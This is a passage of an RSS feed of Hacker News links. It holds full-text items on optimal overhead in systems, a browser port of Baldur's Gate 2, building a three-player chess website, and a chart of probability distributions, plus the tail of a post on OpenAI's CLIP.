</p><h2 id="conclusion">Conclusion</h2><p>If you find that CLIP's performance is not as high as you would like, you may still want to consider <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">training a custom image classification model with supervision</a>.</p><p>For more on CLIP research, consider reading <a href="https://cdn.openai.com/papers/Learning_Transferable_Visual_Models_From_Natural_Language_Supervision.pdf">the paper</a> and checking out <a href="https://openai.com/blog/clip/">OpenAI's blog post</a>. And we'd love to hear if you discover anything interesting when playing around with the model! Be sure to <a href="https://twitter.com/roboflowai">drop us a line on twitter</a>.</p><p>As always, happy inferencing!</p></div>
                
              </div>
            </div></div>]]>
            </description>
            <link>https://blog.roboflow.com/how-to-use-openai-clip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687532</guid>
            <pubDate>Fri, 08 Jan 2021 17:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Drives Optimal Overhead?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687485">thread link</a>) | @swyx
<br/>
January 8, 2021 | https://www.swyx.io/optimal-overhead/ | <a href="https://web.archive.org/web/*/https://www.swyx.io/optimal-overhead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>What determines the optimal amount of overhead in a system?</strong></p>
<p>This question has been bothering me ever since I began my informal study of computer and human systems. Systems thinkers are usually very thoughtful types, but as far as I can tell nobody's answered it yet.</p>
<p>This strikes me as odd, because it is an <em>incredibly</em> important number to manage.</p>
<p>
  <img src="https://dev-to-uploads.s3.amazonaws.com/i/c1o3owg0liv43ixque75.png" alt="Optimal Overhead drawing">
</p>
<section>
  <h2 id="defining-overhead"><a href="#defining-overhead">Defining Overhead</a></h2>
  <p>I use the word in the conceptual sense here, closer to <a href="https://stackoverflow.com/questions/2860234/what-is-overhead">StackOverflow</a> than <a href="https://en.wikipedia.org/wiki/Overhead_(computing)">Wikipedia</a>. I'm pretty poor at defining things – but it's important, so here's my attempt:</p>
  <p>Pretend your job is to do as much as possible of a certain task (producing <strong>output</strong>), given limited resources (<em>time, CPU, memory, bundle size, people...</em>). <strong>Overhead</strong> is the percentage of resources you spend <strong>not</strong> directly producing — in order to do <em>produce even more</em> with the remaining resources.</p>
  <p>Sometimes overhead is also known as "footprint".</p>
</section>
<section>
  <h2 id="some-examples"><a href="#some-examples">Some Examples</a></h2>
  <p>Before I lose you, here are some examples of overhead (of course, these are very imprecise, just roll with it):</p>
  <ul>
    <li><strong>Operating Systems</strong>: We could run our apps on "bare metal", but we don't. In this case the goal isn't necessarily running the most apps or running them the fastest; we use OSes to improve user and developer experience.
      <ul>
        <li>Windows 10's <a href="https://howmonk.com/how-much-cpu-usage-is-normal/">idle CPU usage is 2-4%</a> (high variability)</li>
        <li>MacOS is less conclusive, maybe <a href="https://apple.stackexchange.com/a/377067">6%</a> (high variability)</li>
        <li>iOS "System Storage" takes up <a href="https://www.imyfone.com/iphone-space-saver/ios-storage-management/#:~:text=The%20%E2%80%9CSystem%E2%80%9D%20storage%20is%20the,64GB%20iPhone%20would%20be%209GB.">25% of a 16GB iPhone</a> (less with more memory)</li>
      </ul>
    </li>
    <li><strong>Virtualization</strong> has between <a href="https://serverfault.com/questions/261974/how-much-overhead-does-x86-x64-virtualization-have">9-35% overhead</a> (or <a href="https://serverfault.com/questions/135431/is-virtual-machine-slower-than-the-underlying-physical-machine">1-5% of CPU and 5-10% Memory</a>). Docker has <a href="https://stackoverflow.com/questions/21889053/what-is-the-runtime-performance-cost-of-a-docker-container">minimal performance overhead</a> and it seems so does <a href="https://www.researchgate.net/figure/Performance-overhead-of-Kubernetes-and-Docker-Swarm-in-comparison-to-VM-Docker-and_fig2_329830385">Kubernetes</a> (the learning curve overhead is a different question, discussed below).</li>
    <li>Cloudflare Workers <a href="https://blog.cloudflare.com/introducing-workers-unbound/">abandon containers for isolates</a>. If you believe the image shown, the process overhead inverts from ~90% to ~10%.
      <ul>
        <li>Obviously the image is not drawn to scale, but it's clear the overhead reduction is large (<em>If you're a knowledgeable reader, I'd love to get actual ballpark numbers on this</em>)</li>
      </ul>
    </li>
    <li>React takes about 8% of compute in apps, <a href="https://twitter.com/sebmarkbage/status/1201251406604197888?s=20">by FB's own numbers</a></li>
    <li>1 Manager should support 6-8 engineers, says <a href="https://lethain.com/sizing-engineering-teams/">Will Larson</a>. Aka 12.5% to 16.7% overhead.</li>
    <li>Cal Newport <a href="https://www.calnewport.com/blog/2013/12/21/deep-habits-the-importance-of-planning-every-minute-of-your-work-day/">takes 10-20 minutes to plan out every work day</a>. Assuming an 8hr work day, that's just a 3% overhead.</li>
    <li>Every entrepreneur struggles with the balance between "working ON the business" and "working IN the business" (coined by <a href="https://www.quora.com/What-is-the-difference-between-working-in-the-business-and-working-on-the-business">Michael Gerber</a>). I think a ratio of 1:4 works well (say <a href="https://davidcummings.org/2015/11/08/working-in-the-business-vs-on-the-business/">10%</a>-<a href="https://makersbusinesstoolkit.com/working-on-your-business-and-working-in-your-business/">25%</a> overhead in reality).</li>
  </ul>
</section>
<section>
  <h2 id="too-much-or-too-little"><a href="#too-much-or-too-little">Too Much, or Too Little?</a></h2>
  <p>We don't directly care about how much overhead we use; we just want to maximize output. But clearly everything about how we plan and do our jobs will be wildly different depending on whether optimal overhead is 5% or 50%. (This can serve as a very useful filter for choosing tech and architecture, for example.)</p>
  <p>Increasing overhead often makes sense. This goes by many names: <a href="https://www.mckinsey.com/business-functions/organization/our-insights/the-organization-blog/slowing-down-to-speed-up">Slow down to speed up</a>. <a href="https://www.franklincovey.com/the-7-habits/habit-7/">Sharpen the saw</a>. <a href="https://xkcd.com/1319/">Automate repeated tasks</a>.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/s0juvjpuholarztbyfx8.png" alt="Alt Text">
  </p>
  <p>But sometimes the overhead isn't worth it, and we can't tell. Sometimes we should just be doing the thing rather than doing setup to do the thing. You see variants of this debate all over the place, from <a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">Virtual DOM is pure overhead</a> to <a href="http://paulgraham.com/ds.html">Do Things That Don't Scale</a>.</p>
  <p>By definition, <strong>overhead is indirectly linked to output</strong>. This link can be nonlinear, and noisy:</p>
  <ul>
    <li>Imagine if you were taught to keep 30% overhead, but decided to try dropping down to 10%, and observed <strong>no change</strong> in output efficiency. (<a href="https://www.inputmag.com/culture/uber-burned-through-100-million-thanks-to-digital-ad-fraud">like Uber did</a>)</li>
    <li>You would go from spending 70% of your resources producing, to 90% of your resources producing, with the same output per resource. This would be <strong>a 29% increase</strong> in output you've been missing out on the entire time! You'd be pissed!</li>
    <li>And then imagine if someone else did it and got completely different results instead — and everyone was okay with it. No further study conducted.</li>
  </ul>
  <p><strong>That's our state of understanding of overhead in systems as of today.</strong></p>
  <p>This is closer to how real life overhead charts might look like:</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/s8o529o897x1z2vmyx4h.png" alt="Alt Text">
  </p>
  <p>Imagine if we had a "Science of Overhead". I'd settle for just being able to do <a href="https://github.com/sirupsen/napkin-math">napkin math</a> on it. A ballpark range for overhead would reduce our uncertainty and help us find optimal (or tolerable, see below) overhead.</p>
</section>
<section>
  <h2 id="determinants"><a href="#determinants">Determinants</a></h2>
  <p><strong>I don't have an answer.</strong> This post is me thinking aloud. But here are some hypotheses I am exploring.</p>
  <section>
    <h3 id="big-o"><a href="#big-o">Big O</a></h3>
    <p>Overhead is governed by Big O as well. It's not super meaningful to measure the storage overhead of an operating system in percentages, because it is a fixed size - O(1).</p>
    <p>You can make an argument that virtualization overhead scales O(N) with N being the number of VMs.</p>
    <p>Anything involving networking and communication suffers combinatorial/Metcalfe's law explosion, leading to nonlinearly increasing O(N^2) or worse inefficiency.</p>
  </section>
  <section>
    <h3 id="learning-curve"><a href="#learning-curve">Learning Curve</a></h3>
    <p>A unique form of overhead is something you can pay once and amortize <em>across repeated projects</em>, instead of only having a useful life of one project. This is known as a <strong>learning curve</strong>.</p>
    <p>All frameworks bear this sort of overhead: For any one project, you might be able to get things done faster AND have faster running code, if you just did the project using "vanilla" code instead of learning the framework and then doing the project. You only see the benefits down the line once you work on multiple similar projects.</p>
    <p>You might also then overinvest in the framework, only to find out that other projects aren't a fit, or, vice versa, the framework doesn't scale for your needs in some unforeseen way.</p>
    <p>There are two unknowns to learn:</p>
    <ul>
      <li>learning about the problem</li>
      <li>learning about various solutions</li>
    </ul>
    <p>One very good reason to use a framework is that it encodes more knowledge about the problem than you may have. But it can also be a crutch that gets in the way of you learning about the problem in the first place. And when you know enough about the problem and enough about the limitations of existing solutions, you may be forced to make your own.</p>
    <p><strong>All of this is very familiar to experienced programmers.</strong></p>
    <p><strong>And all of this is (tiresome, sometimes very unproductive) overhead.</strong></p>
    <p>The primary challenge of "learning curve" type overhead isn't the amortization math. This is intuitive.</p>
    <p>What is particularly intractable is <a href="https://en.wikipedia.org/wiki/Knightian_uncertainty">Knightian uncertainty</a> around <strong>not knowing what you don't know</strong>. By definition, if you haven't learned it yet, you may not really know how to evaluate it fully and have to rely on secondhand reports and endorsements.</p>
    <p>I hold out faith that this is a manageable, if not solvable problem. I have a strong suspicion that becoming a technical or people leader <strong>means</strong> developing some skill in managing for unknowns. It is a truism that scaling yourself, beyond just you, means you have to manage people whose jobs you have never done and technologies whose alternatives you have never used.</p>
    <blockquote>
      <p>Note: Done badly, the above can be a particularly loathsome form of <a href="https://www.newyorker.com/books/under-review/the-bullshit-job-boom">bullshit job</a>. And yes — this includes product management and blogging — both roles that I perform. Always beware <a href="https://www.epsilontheory.com/gell-mann-amnesia/">Gell-Mann Amnesia</a>.</p>
    </blockquote>
  </section>
  <section>
    <h3 id="humans-vs-machines"><a href="#humans-vs-machines">Humans vs Machines</a></h3>
    <p>You might be tempted to conclude that human systems naturally have higher overhead, as I was. Joel Spolsky's discussion of <a href="https://www.joelonsoftware.com/2006/04/11/the-development-abstraction-layer-2/">Development Abstraction Layers</a> noted:</p>
    <blockquote>
      <p>"It is not a coincidence that the Roman army had a ratio of four servants for every soldier. This was not decadence. Modern armies probably run 7:1."</p>
    </blockquote>
    <p><a href="https://lethain.com/">Will Larson</a> also commented that <a href="https://www.bbc.com/worklife/article/20191107-the-law-that-explains-why-you-cant-get-anything-done">Parkinson's Law originated from a similar observation that the British Navy's bureaucracy</a> kept growing at the same rate regardless of the underlying work declining by 2/3rds.</p>
    <blockquote>
      <p>Side note: <a href="https://xdg.me/">David Golden</a> notes that military <a href="https://en.wikipedia.org/wiki/Tooth-to-tail_ratio">"tooth to tail"</a> ratios aren't really the same thing as overhead.</p>
    </blockquote>
    <p>But it's not always true. The US civil service is about 2% of the overall US labor force (you may be surprised to find, as I was, that Singapore's equivalent "overhead" is ~4%). Something that some operating systems would be proud of.</p>
  </section>
</section>
<section>
  <h2 id="tolerable-overhead"><a href="#tolerable-overhead">Tolerable Overhead</a></h2>
  <p>Perhaps it is too much of an optimization exercise to aim for <em>optimal</em> overhead, given how noisy this whole process is. A lower bar we can aim for is <strong>Tolerable Overhead</strong>, suggested by <a href="https://xdg.me/">David Golden</a>. To me this is like a "first do no harm" principle of overhead - make sure you are at least no less productive with overhead than you were without it.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/v1vigbjn6g13d7qhi30t.png" alt="Alt Text">
  </p>
</section>
<section>
  <h2 id="postscript-redundancy-vs-overhead"><a href="#postscript-redundancy-vs-overhead">Postscript: Redundancy vs Overhead</a></h2>
  <p>You can find examples of "redundancy" everywhere in distributed systems. MongoDB recommends <a href="https://docs.mongodb.com/manual/core/replica-set-architecture-three-members/">3 member replica sets</a>, but Google famously requires <a href="https://dataskeptic.libsyn.com/byzantine-fault-tolerant-consensus">5 nodes for fault tolerance</a>. Of course by nature these are &gt;100% numbers - and <a href="https://xdg.me/">David Golden</a> rightly pointed out to me that they aren't comparable to overhead.</p>
</section>
<section>
  
  <p>I will update this post with more reads and numbers as I come across them. Ultimately I'd like to achieve a good reference table like this epic <a href="https://danluu.com/input-lag/">Dan Luu post on Computer Latency</a>.</p>
  <p>I did a fun talk about <a href="https://www.youtube.com/watch?v=atOIxTHylF8">Svelte and the Great Space Elevator</a> where I discussed how we pay for overhead in frontend frameworks.</p>
</section>
</div></div>]]>
            </description>
            <link>https://www.swyx.io/optimal-overhead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687485</guid>
            <pubDate>Fri, 08 Jan 2021 17:52:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Baldur's Gate 2 reincarnated in the browser using WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25687261">thread link</a>) | @yuri91
<br/>
January 8, 2021 | https://browser-games.itch.io/baldursgate2 | <a href="https://web.archive.org/web/*/https://browser-games.itch.io/baldursgate2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="header"><p><img alt="Baldur's Gate 2 Demo (Web Edition)" src="https://img.itch.zone/aW1nLzMzOTMyMDYuanBn/original/ymT9Bf.jpg"></p></div><div id="view_html_game_page_64197"><div id="html_embed_widget_101"><div data-height="800" data-width="1000"></div></div><div><div><div><p>Link to Discord community:&nbsp;<a href="https://discord.gg/zUSZ3T8" rel="nofollow noopener">https://discord.gg/zUSZ3T8</a></p></div><div><div><span>More information<svg height="6" width="12" role="img" aria-hidden="" viewBox="0 0 37 20" version="1.1"><path d="m2.0858 0c-1.1535 0-2.0858 0.86469-2.0858 1.9331 0 0.5139 0.21354 1.0183 0.38704 1.1881l18.113 16.879 18.112-16.879c0.174-0.1696 0.388-0.674 0.388-1.1879 0-1.0684-0.932-1.9331-2.086-1.9331-0.577 0-1.111 0.23008-1.49 0.57992l-14.924 13.894-14.925-13.893c-0.3777-0.34998-0.9134-0.581-1.4902-0.581z"></path></svg></span></div><div><div><table><tbody><tr><td>Updated</td><td><abbr title="08 January 2021 @ 18:16"><span></span> 2 days ago</abbr></td></tr><tr><td>Status</td><td><a href="https://itch.io/games/released">Released</a></td></tr><tr><td>Platforms</td><td><a href="https://itch.io/games/html5">HTML5</a></td></tr><tr><td>Author</td><td><a href="https://browser-games.itch.io/">browser games</a></td></tr><tr><td>Genre</td><td><a href="https://itch.io/games/genre-rpg">Role Playing</a></td></tr></tbody></table></div></div></div><div><h2 id="comments">Leave a comment</h2><p><a href="https://itch.io/login?return_to=https%3A%2F%2Fbrowser-games.itch.io%2Fbaldursgate2" data-register_action="comment">Log in with itch.io</a> to leave a comment.</p><div id="community_topic_posts_widget_47336"></div></div></div><div><p><a href="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/original/Eh%2FX49.jpg" target="_blank" data-image_lightbox="true"><img src="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/347x500/O3hTpf.jpg"></a></p></div></div></div><div id="view_game_footer"><a href="https://itch.io/"><svg height="17" width="20" role="img" aria-hidden="" viewBox="0 0 262.728 235.452" version="1.1"><path d="M31.99 1.365C21.287 7.72.2 31.945 0 38.298v10.516C0 62.144 12.46 73.86 23.773 73.86c13.584 0 24.902-11.258 24.903-24.62 0 13.362 10.93 24.62 24.515 24.62 13.586 0 24.165-11.258 24.165-24.62 0 13.362 11.622 24.62 25.207 24.62h.246c13.586 0 25.208-11.258 25.208-24.62 0 13.362 10.58 24.62 24.164 24.62 13.585 0 24.515-11.258 24.515-24.62 0 13.362 11.32 24.62 24.903 24.62 11.313 0 23.773-11.714 23.773-25.046V38.298c-.2-6.354-21.287-30.58-31.988-36.933C180.118.197 157.056-.005 122.685 0c-34.37.003-81.228.54-90.697 1.365zm65.194 66.217a28.025 28.025 0 0 1-4.78 6.155c-5.128 5.014-12.157 8.122-19.906 8.122a28.482 28.482 0 0 1-19.948-8.126c-1.858-1.82-3.27-3.766-4.563-6.032l-.006.004c-1.292 2.27-3.092 4.215-4.954 6.037a28.5 28.5 0 0 1-19.948 8.12c-.934 0-1.906-.258-2.692-.528-1.092 11.372-1.553 22.24-1.716 30.164l-.002.045c-.02 4.024-.04 7.333-.06 11.93.21 23.86-2.363 77.334 10.52 90.473 19.964 4.655 56.7 6.775 93.555 6.788h.006c36.854-.013 73.59-2.133 93.554-6.788 12.883-13.14 10.31-66.614 10.52-90.474-.022-4.596-.04-7.905-.06-11.93l-.003-.045c-.162-7.926-.623-18.793-1.715-30.165-.786.27-1.757.528-2.692.528a28.5 28.5 0 0 1-19.948-8.12c-1.862-1.822-3.662-3.766-4.955-6.037l-.006-.004c-1.294 2.266-2.705 4.213-4.563 6.032a28.48 28.48 0 0 1-19.947 8.125c-7.748 0-14.778-3.11-19.906-8.123a28.025 28.025 0 0 1-4.78-6.155 27.99 27.99 0 0 1-4.736 6.155 28.49 28.49 0 0 1-19.95 8.124c-.27 0-.54-.012-.81-.02h-.007c-.27.008-.54.02-.813.02a28.49 28.49 0 0 1-19.95-8.123 27.992 27.992 0 0 1-4.736-6.155zm-20.486 26.49l-.002.01h.015c8.113.017 15.32 0 24.25 9.746 7.028-.737 14.372-1.105 21.722-1.094h.006c7.35-.01 14.694.357 21.723 1.094 8.93-9.747 16.137-9.73 24.25-9.746h.014l-.002-.01c3.833 0 19.166 0 29.85 30.007L210 165.244c8.504 30.624-2.723 31.373-16.727 31.4-20.768-.773-32.267-15.855-32.267-30.935-11.496 1.884-24.907 2.826-38.318 2.827h-.006c-13.412 0-26.823-.943-38.318-2.827 0 15.08-11.5 30.162-32.267 30.935-14.004-.027-25.23-.775-16.726-31.4L46.85 124.08c10.684-30.007 26.017-30.007 29.85-30.007zm45.985 23.582v.006c-.02.02-21.863 20.08-25.79 27.215l14.304-.573v12.474c0 .584 5.74.346 11.486.08h.006c5.744.266 11.485.504 11.485-.08v-12.474l14.304.573c-3.928-7.135-25.79-27.215-25.79-27.215v-.006l-.003.002z"></path></svg></a><p><a href="https://itch.io/">itch.io</a><span>·</span><a href="https://browser-games.itch.io/">View all by browser games</a><span>·</span>Report<span>·</span>Embed<span>·</span></p><p>Updated <abbr title="08 January 2021 @ 18:16"> 2 days ago</abbr></p><div><p><a href="https://itch.io/games">Games</a> › <a href="https://itch.io/games/genre-rpg">Role Playing</a> › <a href="https://itch.io/games/free">Free</a></p></div></div></div></div></div>]]>
            </description>
            <link>https://browser-games.itch.io/baldursgate2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687261</guid>
            <pubDate>Fri, 08 Jan 2021 17:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a three-player chess website]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687228">thread link</a>) | @Smlep
<br/>
January 8, 2021 | https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html | <a href="https://web.archive.org/web/*/https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="context">Context</h2>

<p>Around the end of 2019, as we were going through our few last months of
engineering school, we ended up having a quite consequent amount of free
time due to the highly irregular organisation of courses throughout the year.</p>

<p>Daniel, a friend of mine from school who has
been a huge fan of chess for a while now told us one night about how he read 
about this chess variant with three players and how he thought it would be
interesting to build a game engine for it.</p>

<p>Since I had time to <del>waste</del> spend building something <del>funny</del> meaningful,
I was interested in getting involved in this project to make it grow and be
something more than only a game engine (which I thought nobody would use
anyway, since playing chess through command line on a single computer does not
seem that appealing).</p>

<p>That’s how, Daniel, Vincent (another friend from school with whom I had
worked on many side projects), and I decided that we were going to build a
website so that people could come and play chess with two of their
friends.</p>

<h2 id="what-is-three-player-chess">What is three-player chess?</h2>

<p>Some might wonder what really is 3-player chess, do the rules change
when introducing a third player, and if they do, how?</p>

<p>Even though 3-player chess seems like a simple and precise concept, there are many variations
with light differences and not one set of rules for 3-player chess. These different
variations come in variants with different names (Trichess, Chess for three, Three-Player
Chess, Yalta chess…) but not every mention of one variant describes the same rules and
there is a huge lack of norm here.</p>

<p>The variation of chess played on <a href="https://yalta-chess.com/">yalta-chess.com</a> can be
considered as a unique variant, but mostly inspired by <strong>Yalta Chess</strong> (not much suspense
here) from which we tried to follow the rules as much as possible, but once again, the rules
differed depending on the articles.</p>

<p>On our website, you’ll play on a 96-cell board (32 for each player, just like usual chess).</p>

<p><img src="https://smlep.github.io/assets/yalta-animation4.gif" alt="Yalta board"></p>

<p>The moves are the same as classic chess, but it can take some time to get used to the
moves around the center or the board when starting to play <strong>Yalta Chess</strong>. The only real difference
with 2-player chess is how winners and losers are handled.</p>

<p>The winner is the first player to checkmate another player, meaning that there are one
winner and two losers. This makes the game more interesting, rewarding aggressive strategies
since playing too defensive might end up in a loss where one of the other players checkmated
the third player.</p>

<h2 id="early-development">Early development</h2>

<p>Our initial goal was pretty simple and seemed easy to accomplish, the
tasks which needed to be done could have been summed up as:</p>

<ul>
  <li>Building a game engine, implementing every rule and move.</li>
  <li>Having a game page on which 3 players could play together with a decent user
experience.</li>
  <li>Having a basic matchmaking system, so that players could join games easily.</li>
</ul>

<p>It looked easy and fast, the game engine was the main challenge since the special
shape of the board made the classic 2-player chess implementation unsuitable for
our needs and we needed to come up with a smart way to handle the board. Once the
game engine was out of the way, the only remaining thing would be to build a simple
website with basic functionalities.</p>

<p>Two of us already had some web development knowledge which we acquired through previous
side-projects, I would not say that we were <strong>amazing</strong> (or good) web developers,
but we were at least decent. Well, for the backend at least, our UI/UX level was (and
still is, but those who saw the website already know that) pretty bad.</p>

<p>Since we weren’t looking for high performances in our game engine because a few
milliseconds were not going to impact the user experience, building the engine was
actually pretty fast. One of us focused on it, and after a few days we had a game engine
implementing the rules and about everything we needed except <em>promotions</em>, <em>castling</em>, and
<em>en passant</em> which came later.</p>

<p>Our implementation relied on the fact that instead of using one 8x8 board as in 2-player
chess, we considered the board as 3 distinct 4x8 sub-boards, each sub-board filled with a
different color on the example below: 
<img src="https://smlep.github.io/assets/yalta-subboards.png" alt="Yalta debug mode"></p>

<p>The website, on the other hand, was way more complicated than we anticipated, handling
concurrent plays with real-time information transfer between the players (without
refreshing after each move) and implementing a decent user experience was much more
challenging than we expected.</p>

<p>Our first playable version looked like this:</p>

<p><img src="https://smlep.github.io/assets/yalta-debug.gif" alt="Yalta debug mode"></p>

<p>With the three boards representing the three sides of the board as explained above.</p>

<p>This first version allowed us to check that our engine worked as intended, but
required us to refresh a page to see the other players’ moves and wasn’t very user friendly.</p>

<p>That’s when we really became aware that the website part of the project would require
an amount of work strongly higher than the game engine implementation.</p>

<h2 id="a-basic-project">A basic project</h2>

<p>The more we implemented new features on our website, the more features we thought about
which seemed to be required to have a decent user experience on the website. Some of these features
were not necessary but seemed like good ideas/interesting to implement so we implemented some of them
and the others were listed and put aside for later.</p>

<p>After a few weeks, we had a decent result for the play part of the website; three players could
play on the same page, moving by selecting a piece and moving it to its location and seeing the actions’
results in real-time.</p>

<p>Our first <em>matchmaking</em> system was fairly basic, there was a list of created games, and any player
could join any game, if the user was the third player to join a game, it would start, and if there were
3 players already in the game, the user would be considered as a spectator. On top of that, any user
could create a new game.</p>

<p>At this time we had already spent way more time on this project than we thought we were going to,
even though we had only implemented the features we thought were necessary to have a good time
playing the game. The website’s current state was enough to send the link to some friends and play
games with them if we wanted to, the global design of the website wasn’t nice, but playing stayed pretty intuitive.</p>

<p><img src="https://smlep.github.io/assets/yalta-landing-1.png" alt="Landing page"></p>

<h2 id="not-so-basic-anymore">Not so basic anymore</h2>

<p>When we started this project, we did not define the real scope of users who would use it,
the more we worked on it and the more features we started implementing, the more we started to
want to make it public so that everyone could come and play.</p>

<p>As we started having less free time due to school projects and then the real jobs we got
after graduating, we spent way less time developing this project the following months but we kept working
on it and added a lot of new sfeature. Some of those being necessary for a public release,
some that we felt were a really nice addition for users and some which might just be
really useless (Hello, in-game chat). Among these extra-features are:</p>

<ul>
  <li>A custom game system to play with friends with custom settings</li>
  <li>A public queue system to play with random unknown players</li>
  <li>A training mode to play against bots in different difficulties</li>
  <li>A profile system with ranks, elo, skins, themes, and statistics</li>
  <li>Game timers</li>
  <li>A board rotation system, to see the board as one of your opponents</li>
  <li>An in-game chat</li>
  <li>The possibility to show replays of games</li>
  <li>A documentation section to explain the website and the game rules</li>
  <li>A landing page to explain to new users what happens here</li>
  <li>A new implementation of the game engine with improved performances
and a graph system (replacing the 3x4x8 sub-boards implementation)</li>
</ul>

<p>And of course, a landing page to welcome new players to our website.
The old matchmaking system based on a game list was removed, since the public
queue and private game system fully replaced the need for it.</p>

<p><img src="https://smlep.github.io/assets/yalta-ways-to-play.png" alt="Ways to play"></p>

<h2 id="costs-and-revenues">Costs and revenues</h2>

<p>As we added new features and new services which started to increase potential costs, we had to
consider the <em>business</em> aspect of the website. We were not fully against trying to monetize it but
we did not want this to impact the user experience, driving potential users away because of
<em>aggressive advertising</em> or <em>pay-to-win</em> systems.</p>

<p>We considered <strong>ads</strong>, but generic ads (such as adsense) would require to have a huge 
amount of traffic to really generate money and they usually don’t fit well into a website. We did
not want our website to get significantly less enjoyable for users just to win a few euros every month (or year).</p>

<!--
Another thing we considered was to bring premium content to the website, allowing users to purchase
differents assets such as skin. The issue with this solution is that it is really hard to find good
content which will not impact the other users impact experience.
We did implement a skin system, so that players could update the apparences of their pieces, so that
we could set up a system where the users would be able to buy these apparences. But the impact on the
other players which were just trying to focus would be too high, who wants to start a game and be
matched again a player with flashy purple pieces?
There are options to prevent this scenario such as adding a button to hide every opponents skin, but
players won't buy skins if the other players can't see it.
-->

<p>We considered some other solutions than ads but in the end, <strong>we did not find an adequate business model</strong>.
Not being able to generate revenue is not currently an issue, since the goal never was to quit our jobs and
start working on this project every day of the week. Nevertheless, we did not anticipate when we started this
project (before we decided to add many unexpected features) that there were gonna be real costs to run
the website.</p>

<p>Indeed, the website now runs using many different services and tools which come with a cost, meaning
that we cannot sustain with this business model (which is not one, since we generate no revenue) if
our user count grows too much.</p>

<p>As long as our monthly costs stay under a few dozen of euros, it is
fine, I’d say that we are happy to pay for it if some people are happy to play on
<a href="https://www.yalta-chess.com/">yalta-chess.com</a>. But if this website became too popular, we would have
to scale up the different services we pay for (hosting, Redis, database…), resulting in hundreds of
euros bills.</p>

<p>Hence, if too many people end up enjoying our website, at some point we will have to <strong>shut it
down</strong> (or strongly restrict traffic) if we still cannot generate revenue.</p>

<p>This is really <strong>unlikely</strong> to happen since we don’t plan on doing real advertising for this project,
and we are not so presumptuous as to think that this website is good enough to deserve this much 
success. But we still have to consider this scenario, and if it happens we will still try to consider
ways to generate revenue, we are not fully closed to ads, but we feel like right now nothing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</a></em></p>]]>
            </description>
            <link>https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687228</guid>
            <pubDate>Fri, 08 Jan 2021 17:34:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Map of Randomness]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687087">thread link</a>) | @lolptdr
<br/>
January 8, 2021 | https://www.telescopic-turnip.net/cookbooks/the-map-of-randomness/ | <a href="https://web.archive.org/web/*/https://www.telescopic-turnip.net/cookbooks/the-map-of-randomness/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1333">
		<!-- .entry-header -->

	
	<div>
		
<p>In <a href="https://doi.org/10.1198/000313008X270448">this paper from 2012</a> (full text <a href="https://www.telescopic-turnip.net/documents/articles/leemis2012.pdf">here</a>), Leemis and McQueston show a diagram of how probability distributions are related to each other. As I liked it really much, I extracted the chart from the pdf, turned it into a poster, and printed a giant version of it to stick on the wall of my apartment. I thought I would also share it here:</p>



<figure><img src="https://www.telescopic-turnip.net/documents/figures/distributions.png" alt=""></figure>



<p>The full-size vector graphic version (as pdf) can be downloaded <a href="https://www.telescopic-turnip.net/documents/figures/distributions.pdf">here</a>.</p>



<h3>Some explanation</h3>



<p>Things can be random in many different ways. It’s tempting to think “if it’s not deterministic, then it’s random and we don’t know anything about it”, but that would be wrong. There is an entire bestiary of probability distributions, with different shapes and different properties, that tell you how likely the possible outcomes are relative to each other. What’s interesting is that each distribution describes the outcome of a particular class of stochastic processes, so by looking at how something is distributed, it’s possible to understand better the process that created it. One can even combine simple processes together or morph their parameters to build more complicated processes. <em>The map above tells you how the probability distribution changes when you do that. </em></p>



<p>Let’s look at an example. You are typing on a keyboard. Every time you push a button, there is a certain probability <em>p</em> that you will hit the wrong one. This super simple process is called the <a href="https://en.wikipedia.org/wiki/Bernoulli_process">Bernoulli process</a>, it corresponds to the Bernoulli distribution that you can find near the top-right corner of the map. Now you type a whole page, consisting of <em>n</em> characters. How many errors will you make? This is just a sum of <em>n</em> Bernoulli processes, so we look at the map and follow the arrow that says <span data-katex-display="false">\sum{X_i}</span>, and we reach the binomial distribution<sup data-mfn="1">1</sup><span data-mfn="1">i.i.d. means “Independent and Identically Distributed”. We are assuming your typos are independent from each other.</span>. The number of errors per page follows a binomial distribution with mean <em>np</em> and variance <em>np(1-p)</em>. If you write a book with 1000 characters per page and make one typo per hundred characters, the variance of the number of typos from page to page will be 1000*0.01*0.99=9.9<sup data-mfn="2">2</sup><span data-mfn="2">ISN’T THAT FASCINATING?</span>.</p>



